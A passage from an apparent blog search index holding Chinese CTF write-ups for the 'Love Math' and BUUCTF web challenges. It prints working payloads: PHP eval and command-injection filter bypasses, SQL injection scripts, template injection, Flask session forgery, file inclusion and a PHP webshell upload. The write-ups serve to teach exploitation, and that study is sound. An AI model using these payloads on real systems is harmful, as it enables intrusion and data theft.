发布的漏洞通告。威胁情报：主要是国外站点发布的漏洞信息通告。安全资讯：一些安全的新闻消息站点收录：网站文章收录数量排名和前100名站点的文章数量比例饼图数据详情：有三个柱状图，分别显示近一周、近一年、近10年的数据情况 搜索界面搜索界面提供网页、标题、作者、日期、域名等搜索功能。 内容搜索输入关键字，点击搜索，默认使用的是网页搜索，网页搜索在标题、内容、作者、域名这四个字段中搜索符合关键字的内容，并按照一定的权重计算比分，将搜索结果中，比分较高的文章排在前面，也就是把最可能是你想找的文章排在前面。 标题搜索标题一般都能够揭示文章的范围或论点，通过标题搜索有些时候更能得到我们想要的文章 作者搜索搞安全的人，一般都会给自己取一个 id 名，QQ、微信等平台账号的账户名可能都是同一个id名，有时候想了解一些作者的主要研究方向，可以通过搜索id名，来查看其写的文章。 日期搜索可以通过调整起止日期，来查看某个期间的安全文章，可配合内容、标题、作者搜索。这里说明一下，有的文章在爬取过程中没有匹配到时间，就设置了一个默认的日期值为2011-11-11 域名搜索通过输入站点的域名，来查看该站点是否有被收录。 站点搜索提供每个被收录站点的数据搜索，可以先用域名搜索一下是否有被收录。例如只想搜索先知社区里的文章。想要阅读先知社区最近一周的文章，可搭配日期搜索","categories":[],"tags":[],"author":"ye1s"},{"title":"love_math学习","slug":"ove-math学习","date":"2020-12-29T15:03:41.000Z","updated":"2021-01-05T02:58:10.262Z","comments":true,"path":"article/5fb19bf9.html","link":"","permalink":"https://blog.cfyqy.com/article/5fb19bf9.html","excerpt":"[CISCN 2019 初赛]Love Math","text":"[CISCN 2019 初赛]Love Math 题目 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 题目限制了参数的长度要小于80，且不能包含空格、制表符、换行、单双引号、反引号、[]。并且输入的字符串需要为 $whitelist 中的函数 单双引号被禁止了，函数名提取字符串就无法实现，但是可以想办法从函数的返回结果中获取。 base_convert 1234567&lt;?phpecho base_convert('phpinfo', 36, 10);echo \"\\n\";echo base_convert(55490343972,10,36);//55490343972//phpinfo?&gt; 方法一使用php函数readfile等函数读取文件，但是需要flag.php中的.。相关函数： dechex 十进制转换为十六进制 hexdec 十六进制转换为十进制 hex2bin 转换十六进制字符串为二进制字符串 bin2hex 函数把包含数据的二进制字符串转换为十六进制值 pi作为变量是因为题目有长度限制，白名单中最短的就是这两个字符pi 这里获取.,借助dechex和hex2bin函数，不过hex2bin不在白名单里，还需用base_convert转换。 1234&lt;?phpecho hex2bin(dechex(46));//.?&gt; 最后payload 1($pi=base_convert)(2146934604002,10,36)($pi(727432,10,36).$pi(37907361743,10,36)(dechex(46)).$pi(33037,10,36)); 不过超出了长度限制 方法二使用exec等命令执行nl /*读取文件。 1234567891011&lt;?phpecho base_convert('exec', 36, 20);echo \"\\n\";echo base_convert('hex2bin', 36, 13);echo \"\\n\";echo hexdec(bin2hex('nl /*'));/*471383761671484474260451114*/ 最终payload 1?c=($pi=base_convert)(47138,20,36)($pi(3761671484,13,36)(dechex(474260451114))) 不过这只能打印出同级目录文件下的flag，flag在其他位置就无法打印 方法三刚开始我们知道可以异或出_。并且$没有被 waf，因此我们可以使用$_GET全局变量手动传入参数getshell。虽然[]被过滤，我们依然可以使用{}来提取数组中的值。 123456789101112&lt;?phpecho '1517'^'nrtc';echo \"\\n\";echo base_convert('1517', 36, 10);echo \"\\n\";echo base_convert('nrtc', 36, 10);/*_GET531791109136*/ 最终payload 1?0=system&amp;1=cat /flag&amp;c=$pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 方法四就是用可用的函数和字母进行异或生成大量的字母组合（php中函数名默认为字符串），然后寻找可用的组合 12345678910111213&lt;?php$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];for($k=1;$k&lt;=sizeof($payload);$k++)&#123; for($i = 0;$i &lt; 9; $i++)&#123; for($j = 0;$j &lt;9;$j++)&#123; for($a = 0;$a &lt;=9;$a++)&#123; $exp = $payload[$k] ^ $i.$j.$a; echo($payload[$k].\"^$i$j$a\".\"==&gt;$exp\"); echo \"&lt;br /&gt;\"; &#125; &#125; &#125;&#125; 最终payload 12?c=$pi=(is_infinite^(6).(4)).(rad2deg^(7).(5));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag 方法五如何构造出合适的base_convert进制转换 123456789101112&lt;?php$a = 'hex2bin';for($i = 2; $i &lt; 37; $i++)&#123; for($j = 2; $j &lt; 37; $j++)&#123; if(is_numeric(base_convert($a, $i, $j)))&#123; if(base_convert(base_convert($a, $i, $j), $j, $i) === $a)&#123; echo 'len='.strlen(base_convert($a, $i, $j)).' '.'base_convert参数-&gt;'.base_convert($a, $i, $j).' '.$j.' '.$i.' '.\"\\n\"; &#125; &#125; &#125;&#125;?&gt; dechex的构造 12345678&lt;?php$a = \"_GET\";$num = hexdec(bin2hex($a));echo $num . \"\\n\";echo (base_convert(3761671484,13,36)(dechex($num)));//1598506324//_GET?&gt; paydload 1?c=$pi=base_convert(3761671484,13,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1=system&amp;2=tac /flag 方法六相关函数： getallheaders：获取全部 HTTP 请求头信息 12345678&lt;?phpecho base_convert('exec', 36, 20);echo \"\\n\";echo base_convert('getallheaders', 30, 10)//47138//8768397090111664438?&gt; 1?c=$pi=base_convert,$pi(47138,20,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) exec(getallheaders(){1})，可以获取请求头第一个字段的值，[]被waf可以用{}包囊数字来解决代替绕过中括号和引号参考文章： https://blog.csdn.net/qq_44657899/article/details/106104340https://www.extrader.top/posts/a649e496https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/","categories":[],"tags":[],"author":"ye1s"},{"title":"BUUCTF-WEB-WRITEUP","slug":"BUUCTF-WEB-WRITEUP","date":"2020-12-29T12:58:56.000Z","updated":"2021-01-20T09:05:58.078Z","comments":true,"path":"article/7d6323b8.html","link":"","permalink":"https://blog.cfyqy.com/article/7d6323b8.html","excerpt":"BUUCTF是一个ctf平台,里面都是一些经典赛题。","text":"BUUCTF是一个ctf平台,里面都是一些经典赛题。 [HCTF 2018]WarmUp查看源码，注释有source.php，访问得到源码source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 由源码可知只有重点要绕过emmm::checkFile($_REQUEST[‘file’]) ，实现任意文件包含读取。 可知存在hint.php文件，访问 1&#x2F;source.php?file&#x3D;hint.php 提示 1flag not here, and flag in ffffllllaaaagggg 可知flag存在 中 ，要实现包含读取ffffllllaaaagggg，要先让checkFile 返回True，从下面这部分源码着手 1234567891011121314151617181920$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; 从源码可知先对传入的字符串末尾加？号，进行以？为分割符进行字符串截取，接着url解码，然后再次加？号以？为分割符进行字符串截取，最后在进行白名单的判断。我们可以传入一个url编码后的?，前面连接放着白名单的文件，就可以绕过白名单的判断返回True,后面放着我们想要读取的字符串。浏览器会默认帮我们url解码一次，随意我们要将? 二次url编码。 1source.php?file&#x3D;hint.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg 可得flag我这里对？进行一次url编码可以，倒是有点奇怪，不是会默认解码一次吗?这里还涉及到一个知识点:hint.php%3f双重编码,经过包含时你包含的文件会被当成一个目录 [强网杯 2019]随便注在注入测试中，可以发现增、删、查、改操作的关键字都被过滤了。 1return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); 可以使用堆叠注入得到表名1919810931114514、words 1-1'; show tables; --+ 得到字段名 1-1'; desc 1919810931114514 # 1919810931114514表有1，hahahah两个字段得到数据 1-1'; SET @haha_test = CONCAT('S','ELECT * from `1919810931114514`');PREPARE pr2 FROM @haha_test;EXECUTE pr2 ;# [SUCTF 2019]EasySQL这道题一开始以为是盲注， 没做出来，看大佬们的WP.这题目源码 12345678910111213141516171819202122232425&lt;?php if(isset($post['query']))&#123; $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query'])); if(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query']))&#123; //echo $post['query']; die(\"Nonono.\"); &#125; if(strlen($post['query'])&gt;40)&#123; die(\"Too long.\"); &#125; $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 重点在 1$sql = \"select \".$post['query'].\"||flag from Flag\"; 解法一:这里没有过滤* ，直接 *,1就可以了 1*,1 =&gt; \"select *,1||flag from Flag\"; (1和flag或运算，select * from Flag) 解法二：更改配置把||视为字符串连接符 121;set sql_mode=pipes_as_concat;select 1 =&gt;\"select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag\"; 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能。 [护网杯 2018]easy_tornado有三个文件flag.txt 12&#x2F;flag.txtflag in &#x2F;fllllllllllllag welcome.txt 12&#x2F;welcome.txtrender hints.txt 12&#x2F;hints.txtmd5(cookie_secret+md5(filename)) 提示flag就在/fllllllllllllag 访问跳到 /error?msg=Error ,猜测有模板注入尝试输入/error?msg=1，确实存在模板注入。Python tornado框架存在附属文件 handler.settings,于是尝试输入/error?msg=返回 1&#123;'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6cf024f5-e2ff-4c16-8989-5b16c648ca74'&#125; 根据hints.txt的提示，依据观察三个文件的url地址可知，需要按照如下访问，才可以得到文件的内容。 1&#x2F;file?filename&#x3D;&#x2F;文件名&amp;filehash&#x3D;md5(cookie_secret+md5(文件名)) 脚本如下： 1234567891011121314151617import hashlibdef md5hash(data): md5&#x3D;hashlib.md5() md5.update(data) print(md5.hexdigest()) return md5.hexdigest()def filehash(filename): cookie_secret &#x3D; &quot;6cf024f5-e2ff-4c16-8989-5b16c648ca74&quot; result&#x3D;md5hash((cookie_secret + md5hash(filename.encode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;)) return resultif __name__&#x3D;&#x3D;&quot;__main__&quot;: filename &#x3D; &quot;&#x2F;fllllllllllllag&quot; result&#x3D;&quot;&#x2F;file?filename&#x3D;&#123;&#125;&amp;filehash&#x3D;&#123;&#125;&quot; print(result.format(filename,filehash(filename))) 访问 1&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;232236da1a1b017078826b86cced846a 可得到flag [极客大挑战 2019]EasySQL存在sql注入，万能密码登录 1/check.php?username=admin&amp;password=orandin' or '1 [RoarCTF 2019]Easy Calc查看html源码，可知有calc.php文件，访问可得waf的过滤方式 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125;?&gt; tips:PHP的字符串解析特性: PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格） num参数的值如果为字母就会显示页面请求就会错误。可以猜测这里的waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（主要是waf不是用php写的） answer: 首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是/被过滤了，所以我们用chr(47)绕过,发现flagg文件 1/calc.php?%20num=1;var_dump(scandir(chr(47))) 1/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [极客大挑战 2019]Havefun1234567 &lt;!--$cat=$_GET['cat'];echo $cat;if($cat=='dog')&#123; echo 'Syc&#123;cat_cat_cat_cat&#125;';&#125;--&gt; answer: 1?cat&#x3D;dog [HCTF 2018]admin随便注册一个账号登录，在修改密码的地方，提示源码 1https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; HCTF2018-admin 解法一：session伪造注册一个账号后登入，抓包得到cookie的session,解密得 1&#123;'_fresh': True, '_id': b'fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28', 'csrf_token': b'6298f03ac923b6b7006403d7a5ca798a645e338e', 'image': b'V7hq', 'name': 'test', 'user_id': '10'&#125; 如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，在config.py里可以发现了SECRET_KEY。 1SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' 一个flask session加密的脚本 https://github.com/noraj/flask-session-cookie-manager 利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session即可加密 1python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28&#39;, &#39;csrf_token&#39;: b&#39;6298f03ac923b6b7006403d7a5ca798a645e338e&#39;, &#39;image&#39;: b&#39;V7hq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot; 解法二： unicode 123def strlower(username): username = nodeprep.prepare(username) return username 假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。 1ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin [极客大挑战 2019]Secret File用bp截取数据吧，在302跳转的页面得知secr3t.php 12345&lt;html&gt;&lt;!-- secr3t.php --&gt;&lt;/html&gt; 访问secr3t.php得到 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 利用php://filter的php伪协议读取 1&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php [极客大挑战 2019]LoveSQL联合注入 #在get请求中记得url编码，要不会被当成锚点 1http:&#x2F;&#x2F;666f93b7-713c-4980-819e-74815fd17c90.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;dfg&#39; union select 1,(select group_concat(username,0x23,password) from l0ve1ysq1),3 %23 [SUCTF 2019]CheckIn源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Upload Labs&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;Upload Labs&lt;/h2&gt; &lt;form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;文件名：&lt;/label&gt; &lt;input type=\"file\" name=\"fileUpload\" id=\"file\"&gt;&lt;br&gt; &lt;input type=\"submit\" name=\"upload\" value=\"提交\"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php// error_reporting(0);$userdir = \"uploads/\" . md5($_SERVER[\"REMOTE_ADDR\"]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;file_put_contents($userdir . \"/index.php\", \"\");if (isset($_POST[\"upload\"])) &#123; $tmp_name = $_FILES[\"fileUpload\"][\"tmp_name\"]; $name = $_FILES[\"fileUpload\"][\"name\"]; if (!$tmp_name) &#123; die(\"filesize too big!\"); &#125; if (!$name) &#123; die(\"filename cannot be empty!\"); &#125; $extension = substr($name, strrpos($name, \".\") + 1); if (preg_match(\"/ph|htacess/i\", $extension)) &#123; die(\"illegal suffix!\"); &#125; if (mb_strpos(file_get_contents($tmp_name), \"&lt;?\") !== FALSE) &#123; die(\"&amp;lt;? in contents!\"); &#125; $image_type = exif_imagetype($tmp_name); if (!$image_type) &#123; die(\"exif_imagetype:not image!\"); &#125; $upload_file_path = $userdir . \"/\" . $name; move_uploaded_file($tmp_name, $upload_file_path); echo \"Your dir \" . $userdir. ' &lt;br&gt;'; echo 'Your files : &lt;br&gt;'; var_dump(scandir($userdir));&#125; tips: 1.exif_imagetype 文件类型判断可以通过给上传脚本加上相应的幻数头字节就可以绕过： 123JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF(相当于文本的GIF89a)：47 49 46 38 39 61PNG： 89 50 4E 47 2.user.iniuser.ini详解介绍 answer:首先，构造一个.user.ini文件，内容如下： 12GIF89a auto_prepend_file=a.jpg 然后构造一个a.jpg，内容如下： 12GIF89a&lt;script language='php'&gt; @eval($_POST['pass']);&lt;/script&gt; 然后将两个文件分别上传到服务器上，拿到回显1 菜刀连接本就存在的index.php文件 ，该index.php会包含a.jpg里面的一句话 [极客大挑战 2019]PHP1有www.zip备份文件index.php 12345&lt;?phpinclude 'class.php';$select = $_GET['select'];$res=unserialize(@$select);?&gt; class.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpinclude 'flag.php';error_reporting(0);class Name&#123; private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = 'guest'; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); &#125; if ($this-&gt;username === 'admin') &#123; global $flag; echo $flag; &#125;else&#123; echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); &#125; &#125;&#125;?&gt; tips:__wakeup() 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124) 关于类属性的访问权限： 123public 不用修饰 private 需要加%00类名%00protected 则需要使用%00*%00 answer: 12345678&lt;?phpclass Name&#123; private $username ='admin' ; private $password =100 ;&#125;print(serialize(new Name()));?&gt; 将成员数目2修改为其他数目，private的不可打印字符用%00代替 1O:4:\"Name\":3:&#123;s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;&#125; [极客大挑战 2019]Knife直接菜刀连接flag在根目录 [极客大挑战 2019]Http在html源码中找到Secret.php文件，访问后提示要从https://www.Sycsecret.com访问，bp抓包添加header头部 1Referer: https://www.Sycsecret.com 又提示Please use “Syclover” browser ,修改User-Agent 1User-Agent: Syclover 又提示No!!! you can only read this locally!!! ,添加X-Forwarded-For 1X-Forwarded-For:127.0.0.1 [GXYCTF2019]Ping Ping Ping过滤了空格个flag的关键字 answer:命令执行变量拼接 1&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php 过滤bash用sh执行 1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行 将反引号内命令的输出作为输入执行 1?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96; 可以查看index.php具体的过滤规则 12345678910111213141516171819202122/?ip=&lt;pre&gt;PING 1 (0.0.0.1): 56 data bytes/?ip=&lt;?phpif(isset($_GET['ip']))&#123; $ip = $_GET['ip']; if(preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123; echo preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match); die(\"fxck your symbol!\"); &#125; else if(preg_match(\"/ /\", $ip))&#123; die(\"fxck your space!\"); &#125; else if(preg_match(\"/bash/\", $ip))&#123; die(\"fxck your bash!\"); &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123; die(\"fxck your flag!\"); &#125; $a = shell_exec(\"ping -c 4 \".$ip); echo \"&lt;pre&gt;\"; print_r($a);&#125;?&gt; [ACTF2020 新生赛]Includephp伪协议读取 1?file=php://filter/read=convert.base64-encode/resource=flag.php Hack World写个脚本看过滤了什么 1234567891011121314151617181920212223import requestsdef read_dict(): dict=[] with open(\"sqldict.txt\",'r',encoding=\"utf-8\") as f: for line in f.readlines(): dict.append(line.strip()) return dictdef sql_filter(): url = \"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php\" valueFilter=[] sqlDict=read_dict() for value in sqlDict: data = &#123; \"id\": \"1\" + value &#125; res=requests.post(url=url,data=data) if \"SQL Injection Checked.\" in res.text: valueFilter.append(value) print(\"Filter word: \"+value) print(valueFilter)sql_filter() 源码内容 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php$dbuser='root';$dbpass='root'; function safe($sql)&#123; #被过滤的内容 函数基本没过滤 $blackList = array(' ','||','#','-',';','&amp;','+','or','and','`','\"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./'); foreach($blackList as $blackitem)&#123; if(stripos($sql,$blackitem))&#123; return False; &#125; &#125; return True;&#125;if(isset($_POST['id']))&#123; $id = $_POST['id'];&#125;else&#123; die();&#125;$db = mysql_connect(\"localhost\",$dbuser,$dbpass);if(!$db)&#123; die(mysql_error());&#125; mysql_select_db(\"ctf\",$db); if(safe($id))&#123; $query = mysql_query(\"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1\"); if($query)&#123; $result = mysql_fetch_array($query); if($result)&#123; echo $result['content']; &#125;else&#123; echo \"Error Occured When Fetch Result.\"; &#125; &#125;else&#123; var_dump($query); &#125;&#125;else&#123; die(\"SQL Injection Checked.\");&#125; 由safe函数可知，限制了一些空格、逻辑连接符、注释符、一些操作的关键字。 这里可以用字符串截断函数，把每个字符截断出来。如果当前字符等于某个字符，返回1，否则返回2。 比如: 截取到了flag中的第一个字符f时，从ascii码表里爆破 ， f =a 返回 2 ， f = f 返回1 这里过滤的空格可以用括号代替answer： 12345678910111213141516171819202122232425262728import requestsdef binary(): url=\"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php\" flag=\"\" for i in range(1,100): left = 0x1f right = 0x7f while 1: mid=left+(right-left)//2 if left==mid: flag=flag+chr(left) print(flag) break payload=\"if(ascii((mid((select(flag)from(flag)),&#123;&#125;,1)))&lt;&#123;&#125;,1,2)\" data=&#123; \"id\":payload.format(i,mid) &#125; res=requests.post(url=url,data=data) if \"Hello\" in res.text: right=mid else: left=mid if \"&#125;\" in flag: returnbinary()` ACTF2020 新生赛Exec1| cat &#x2F;flag 强网杯 2019]高明的黑客[极客大挑战 2019]Upload黑名单，没有过滤phtml, 检测文件头，以及过滤了php [极客大挑战 2019]BabySQL过滤了union、select、from、where 得到表名b4bsql,geekuser 1http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa' uniunionon seselectlect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()),3%23 flag 1http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa' uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frofromm b4bsql),3%23 [ACTF2020 新生赛]Uploadphtml绕过 [ACTF2020 新生赛]BackupFileindex.php.bak备份 1234567891011121314151617&lt;?phpinclude_once \"flag.php\";if(isset($_GET['key'])) &#123; $key = $_GET['key']; if(!is_numeric($key)) &#123; exit(\"Just num!\"); &#125; $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo \"Try to find out source file!\";&#125; 弱类型 1key=123 [极客大挑战 2019]BuyFlag [SUCTF 2019]CheckIn综上所述.user.ini的利用条件如下： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache利用.user.ini进行文件上传，参考自从SUCTF 2019 CheckIn 浅谈.user.ini的利用上传这样的一个ini文件 12GIF89aauto_prepend_file=a.jpg 再上传一个a.jpg文件 12GIF89a&lt;script language='php'&gt;system('cat /flag');&lt;/script&gt; [ZJCTF 2019]NiZhuanSiWei题目 123456789101112131415161718&lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 解题：读取useless.php文件 1?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php useless.php 12345678910111213&lt;?php 